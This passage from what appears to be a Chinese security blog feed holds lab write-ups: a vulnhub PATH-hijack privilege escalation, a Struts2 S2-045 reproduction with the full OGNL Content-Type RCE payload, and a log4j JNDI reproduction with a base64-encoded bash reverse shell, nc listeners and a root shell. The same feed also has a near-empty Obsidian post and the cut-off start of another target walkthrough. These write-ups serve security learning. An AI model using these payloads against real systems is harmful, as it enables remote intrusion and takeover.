class="hljs-comment"># ls -laih</span><br>total 52K<br>262153 drwx------  4 root root 4.0K Jul 18  2020 .<br>     2 drwxr-xr-x 18 root root 4.0K Jul 16  2020 ..<br>273162 lrwxrwxrwx  1 root root    9 Jul 16  2020 .bash_history -&gt; /dev/null<br>262359 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>272012 drwxr-xr-x  3 root root 4.0K Jul 16  2020 .<span class="hljs-built_in">local</span><br>273172 lrwxrwxrwx  1 root root    9 Jul 16  2020 .mysql_history -&gt; /dev/null<br>262358 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>272441 -rw-r--r--  1 root root  500 Jul 16  2020 root.txt<br>278753 drwx------  2 root root 4.0K Jul 18  2020 .ssh<br>275269 -rwsr-xr-x  1 root root  17K Jul 18  2020 status<br>272457 -rw-r--r--  1 root root  139 Jul 18  2020 status.c<br>root@midnight:/root<span class="hljs-comment"># cat root.txt</span><br>          ___   ____<br>        /<span class="hljs-string">&#x27; --;^/ ,-_\     \ | /</span><br><span class="hljs-string">       / / --o\ o-\ \\   --(_)--</span><br><span class="hljs-string">      /-/-/|o|-|\-\\|\\   / | \</span><br><span class="hljs-string">       &#x27;</span>`  ` |-|   `` <span class="hljs-string">&#x27;</span><br><span class="hljs-string">             |-|</span><br><span class="hljs-string">             |-|O</span><br><span class="hljs-string">             |-(\,__</span><br><span class="hljs-string">          ...|-|\--,\_....</span><br><span class="hljs-string">      ,;;;;;;;;;;;;;;;;;;;;;;;;,.</span><br><span class="hljs-string">~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------</span><br><span class="hljs-string"></span><br><span class="hljs-string">db2def9d4ddcb83902b884de39d426e6</span><br><span class="hljs-string"></span><br><span class="hljs-string">Thanks for playing! - Felipe Winsnes (@whitecr0wz)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>提权成功</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>在看别人的 WP 的时候发现他们执行的是如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; service<br><span class="hljs-built_in">chmod</span> +x service<br><span class="hljs-built_in">export</span> PATH=/tmp/:<span class="hljs-variable">$PATH</span><br>/usr/bin/status<br></code></pre></td></tr></table></figure><p>查了下为什么文件内容中只有 <code>/bin/sh</code> 还能够被识别然后执行：</p><p><img src="/pic/22e4a9098ed7fc31b886f4aa0c6aa427_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Struct2(s2-045) 复现</title>
    <link href="/2023/08/d967fa845029.html"/>
    <url>/2023/08/d967fa845029.html</url>
    
    <content type="html"><![CDATA[<h1 id="Struct2-s2-045-复现"><a href="#Struct2-s2-045-复现" class="headerlink" title="Struct2(s2-045) 复现"></a>Struct2(s2-045) 复现</h1><blockquote><p>漏洞编号：S2-045<br>CVE 编号：CVE-2017-5638<br>漏洞类型：远程代码执行<br>漏洞级别：高危<br>漏洞风险：黑客通过利用漏洞可以实现远程命令执行。<br>影响版本：struts2.3.5 – struts2.3.31 , struts2.5 – struts2.5.10</p></blockquote><h2 id="Vulhub-搭建漏洞环境"><a href="#Vulhub-搭建漏洞环境" class="headerlink" title="Vulhub 搭建漏洞环境"></a>Vulhub 搭建漏洞环境</h2><p>首先通过 vulhub 搭建漏洞环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulhub/struts2]<br>└─$ <span class="hljs-built_in">ls</span><br>README.md  s2-001  s2-005  s2-007  s2-008  s2-009  s2-012  s2-013  s2-015  s2-016  s2-032  s2-045  s2-046  s2-048  s2-052  s2-053  s2-057  s2-059  s2-061<br><br>┌──(kali㉿kali)-[~/vulhub/struts2/s2-045]<br>└─$ docker-compose up -d   <br>Starting s2-045_struts2_1 ... <span class="hljs-keyword">done</span><br><br>┌──(kali㉿kali)-[~/vulhub/struts2/s2-045]<br>└─$ docker ps           <br>CONTAINER ID   IMAGE                   COMMAND                  CREATED         STATUS         PORTS                                       NAMES<br>2c0710b3d7c8   vulhub/struts2:2.3.30   <span class="hljs-string">&quot;/usr/local/bin/mvn-…&quot;</span>   2 minutes ago   Up 7 seconds   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   s2-045_struts2_1<br></code></pre></td></tr></table></figure><p>测试发现 docker 镜像加速方面，阿里云&gt;华为云&gt;DaoCloud。此外由于 burp suite 默认监听使用的是 8080 端口，这里不修改的话，会与漏洞环境产生冲突导致漏洞服务启动失败</p><h2 id="利用公开-PoC-实现命令执行"><a href="#利用公开-PoC-实现命令执行" class="headerlink" title="利用公开 PoC 实现命令执行"></a>利用公开 PoC 实现命令执行</h2><p>本地浏览器访问</p><p><img src="/pic/013edcb476fd54057102c21253680cec_MD5.png"></p><p>是一个文件上传界面，burp suite 抓包，注意需要关注的是 POST 包，这里随便上传一个文件。</p><p><img src="/pic/f6949596bf31f487046c8056655116bc_MD5.png"></p><p>需要关注的是 Content-Type 字段，这里直接使用网上的 PoC</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type: <span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>得到回显</p><p><img src="/pic/592e227de52220730f5c2017d54f23b3_MD5.png"></p><p>另外有个有意思的事情，如果不上传文件直接点击 Submit 按钮，那么 Content-Type 字段中的 <code>boundary=----WebKitFormBoundaryEbgY49uvRsDTm4ub</code> 不能删除，否则无法实现命令执行</p><blockquote><p>boundary 参数用于定义多部分内容的分界线,它的值是一串随机字符串。在 multipart&#x2F;form-data 类型的请求体中,会用这个 boundary 字符串来分隔不同的内容部分。这样既可以在一个请求中发送多个不同的内容,也方便服务端解析内容的边界。</p></blockquote><p><img src="/pic/4519df4b7563b5fcad45d128d701ad25_MD5.png"></p><p>也可以修改 PoC 来执行不同的命令或者反弹 shell</p><h2 id="PoC-详解"><a href="#PoC-详解" class="headerlink" title="PoC 详解"></a>PoC 详解</h2><p>漏洞发生在 Jakarta 上传解析器，通过构造 content-Type 来实现利用，没看太懂，回头补点 Java 开发的知识</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#xxx</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;&quot;</span>pwd<span class="hljs-string">&quot;&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><code>xxx=&#39;multipart/form-data&#39;</code>主要是让struts程序<code>content_type.contains(“multipart/form-data”)</code>判断为true</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]<br>来获取上下文容器<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#ognlUtil=<span class="hljs-selector-id">#container</span><span class="hljs-selector-class">.getInstance</span>(@com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span><span class="hljs-selector-class">.ognl</span>.OgnlUtil@class  <br>通过容器实例化，对Ognl API的通用访问，设置和获取属性。<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd &#125;)<br>判断目标主机的操作系统类型，并进行执行命令赋值<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#p=new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(#cmds)).(<span class="hljs-selector-id">#p</span><span class="hljs-selector-class">.redirectErrorStream</span>(true)).(#process=<span class="hljs-selector-id">#p</span><span class="hljs-selector-class">.start</span>()).(#ros=(@org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.ServletActionContext@<span class="hljs-built_in">getResponse</span>()<span class="hljs-selector-class">.getOutputStream</span>())).(@org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.IOUtils@<span class="hljs-built_in">copy</span>(<span class="hljs-selector-id">#process</span><span class="hljs-selector-class">.getInputStream</span>(),#ros)).(<span class="hljs-selector-id">#ros</span><span class="hljs-selector-class">.flush</span>())<br>执行攻击命令<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/m0_62008601/article/details/126082104">vulhub-Struts2-045(CVE-2017-5638)漏洞复现_s2-045拿shell_7562ajj的博客-CSDN博客</a></p><p><a href="https://www.anquanke.com/post/id/85674">【漏洞分析】S2-045：Apache Struts2 远程代码执行（RCE）漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>log4j 复现</title>
    <link href="/2023/07/e185c3944248.html"/>
    <url>/2023/07/e185c3944248.html</url>
    
    <content type="html"><![CDATA[<h1 id="log4j-复现"><a href="#log4j-复现" class="headerlink" title="log4j 复现"></a>log4j 复现</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="什么是-log4j"><a href="#什么是-log4j" class="headerlink" title="什么是 log4j"></a>什么是 log4j</h3><h3 id="dnslog-平台"><a href="#dnslog-平台" class="headerlink" title="dnslog 平台"></a>dnslog 平台</h3><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境：</p><ul><li>靶机 IP：192.1.1.128</li><li>攻击机 IP：192.1.1.128</li><li>中转机 IP：192.1.1.138</li></ul><h3 id="安装-vulhub"><a href="#安装-vulhub" class="headerlink" title="安装 vulhub"></a>安装 vulhub</h3><p>安装 docker 和 docker-compose 后即可开始使用 vulhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker.io<br>sudo apt install docker-compose<br></code></pre></td></tr></table></figure><p>git 下载可以使用 <code>git config --global https.proxy &#39;socks5://IP:Port&#39;</code> 来使用本地的代理端口，达到加速下载的目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><p>docker 拉取镜像建议换成国内源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br>    ]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br><br><span class="hljs-comment"># 测试拉取速度</span><br>docker pull wordpress<br></code></pre></td></tr></table></figure><p>切换到漏洞目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub-master/log4j/CVE-2021-44228<br></code></pre></td></tr></table></figure><p>自动拉取镜像搭建漏洞环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulhub/log4j/CVE-2021-44228]<br>└─$ docker-compose up -d    <br>Pulling solr (vulhub/solr:8.11.0)...<br>8.11.0: Pulling from vulhub/solr<br>43c265008fae: Retrying <span class="hljs-keyword">in</span> 1 second<br>43c265008fae: Pull complete<br>af36d2c7a148: Pull complete<br>2b7b4d10e1c1: Pull complete<br>f264389d8f2f: Pull complete<br>1a2c46e93f4a: Pull complete<br>f9506bb322c0: Pull complete<br>96f5dad14c2c: Pull complete<br>c387eff49cc3: Pull complete<br>Digest: sha256:84255b20a2d134fc97bbb0fab7cb826087098ee594fcbc94c3a71def24d31003<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> vulhub/solr:8.11.0<br>Creating cve-2021-44228_solr_1 ... <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>使用 <code>docker ps</code> 命令查看访问端口，通过浏览器访问查看 web 服务是否正常</p><p><img src="/pic/0e191a6e9e73f78f1323bcfac6e2cee1_MD5.png"></p><h3 id="DNSLog-测试"><a href="#DNSLog-测试" class="headerlink" title="DNSLog 测试"></a>DNSLog 测试</h3><p>首先使用 DNSLog 平台获取一个域名，然后通过 burp 抓包后，在参数中添加 payload，并进行 URL 编码。</p><p>构造 payload 的时候我们需要知道目标 URL，这个我们可以根据已有的博客或者官方的 API 文档得到</p><p><img src="/pic/c78026d737c76c30f1cf27f84fed7d30_MD5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/daoshad.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure><p>可以直接在浏览器中访问上述链接（替换为自己的路径和域名）</p><p>DNSLog.cn 中刷新得到了记录</p><p><img src="/pic/78ca72608d4cbf5ca97c723c0de8cf6b_MD5.png"></p><p>之后在使用 JNDI 注入工具时，可能是版本问题，导致运行出现错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c <span class="hljs-string">&quot; &#123;echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE3Mi4xOC4wLjEvNjk2OSAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 192.1.1.128<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>[ADDRESS] &gt;&gt; 192.1.1.128<br>[COMMAND] &gt;&gt; bash -c  &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+IC9kZXYvdGNwLzE3Mi4xOC4wLjEvNjk2OSAwPiYxCg==&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br>----------------------------JNDI Links---------------------------- <br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://192.1.1.128:1099/vy06r4<br>ldap://192.1.1.128:1389/vy06r4<br>Target environment(Build <span class="hljs-keyword">in</span> JDK whose trustURLCodebase is <span class="hljs-literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="hljs-keyword">in</span> classpath):<br>rmi://192.1.1.128:1099/jxriw9<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://192.1.1.128:1099/j4u6ro<br>ldap://192.1.1.128:1389/j4u6ro<br><br>----------------------------Server Log----------------------------<br>2023-07-27 06:40:31 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180<br>2023-07-27 06:40:32 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099<br>2023-07-27 06:40:32 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Have connection from /172.18.0.2:41552<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Reading message...<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Is RMI.lookup call <span class="hljs-keyword">for</span> vy06r4 2<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Closing connection<br>Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;Thread-1&quot;</span> java.lang.IllegalAccessError: class jndi.RMIRefServer (<span class="hljs-keyword">in</span> unnamed module @0x4015e7ec) cannot access class com.sun.jndi.rmi.registry.ReferenceWrapper (<span class="hljs-keyword">in</span> module jdk.naming.rmi) because module jdk.naming.rmi does not <span class="hljs-built_in">export</span> com.sun.jndi.rmi.registry to unnamed module @0x4015e7ec<br>        at jndi.RMIRefServer.handleRMI(RMIRefServer.java:343)<br>        at jndi.RMIRefServer.doCall(RMIRefServer.java:299)<br>        at jndi.RMIRefServer.doMessage(RMIRefServer.java:245)<br>        at jndi.RMIRefServer.run(RMIRefServer.java:190)<br>        at java.base/java.lang.Thread.run(Thread.java:833)<br></code></pre></td></tr></table></figure><p>选了另一台 Ubuntu 的机器作为中转机，安装 openjdk 1.8.0_362 版本</p><h3 id="反弹-shell-测试"><a href="#反弹-shell-测试" class="headerlink" title="反弹 shell 测试"></a>反弹 shell 测试</h3><p>工具使用的是 <a href="https://github.com/zzwlpx/JNDIExploit">zzwlpx&#x2F;JNDIExploit: A malicious LDAP server for JNDI injection attacks (github.com)</a> 环境如前所述，在中转机上 1.8 版本的 java 运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~/tools/Log4j-exp/poc$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.1.1.138<br>[+] LDAP Server Start Listening on 1389...<br>[+] HTTP Server Start Listening on 8080...<br></code></pre></td></tr></table></figure><p>攻击机上开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 6666<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 6666 ...<br></code></pre></td></tr></table></figure><p>接下来构造反弹 shell 的 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.1.1.138:1389/</span>Basic<span class="hljs-regexp">/ReverseShell/</span><span class="hljs-number">192.1</span>.<span class="hljs-number">1.128</span>/<span class="hljs-number">6666</span>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中访问得到如下界面</p><p><img src="/pic/028a636dffb351b5629bc9bd4574cade_MD5.png"></p><p>再看监听，发现反弹成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 6666<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 6666 ...<br>connect to [192.1.1.128] from (UNKNOWN) [172.18.0.2] 60728<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@21f80351de19:/opt/solr/server<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p><img src="/pic/b947fa6246f91f85d5729bc7720b1b24_MD5.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/2COe2VwHuHDywwqtekkWQQ">log4j-CVE-2021-44228-vulhub复现 (微信公众号乌鸦安全)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Obsidian 配置</title>
    <link href="/2023/07/d14568407635.html"/>
    <url>/2023/07/d14568407635.html</url>
    
    <content type="html"><![CDATA[<h1 id="Obsidian-配置"><a href="#Obsidian-配置" class="headerlink" title="Obsidian 配置"></a>Obsidian 配置</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1KP4y1B7bd/?spm_id_from=333.999.0.0&vd_source=a057ab968fb9ba52d239d40c767cc40c">Obsidian 外观主题&#x2F;CSS：让你一次退烧_哔哩哔哩_bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>writing tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_decoy 靶机</title>
    <link href="/2023/07/8964cc7f97f4.html"/>
    <url>/2023/07/8964cc7f97f4.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-decoy-靶机"><a href="#sunset-decoy-靶机" class="headerlink" title="sunset_decoy 靶机"></a>sunset_decoy 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.131 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 08:10 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.131<br>Host is up (0.00062s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:0E:3C:2A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.61 seconds<br></code></pre></td></tr></table></figure><p>开放了 22 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 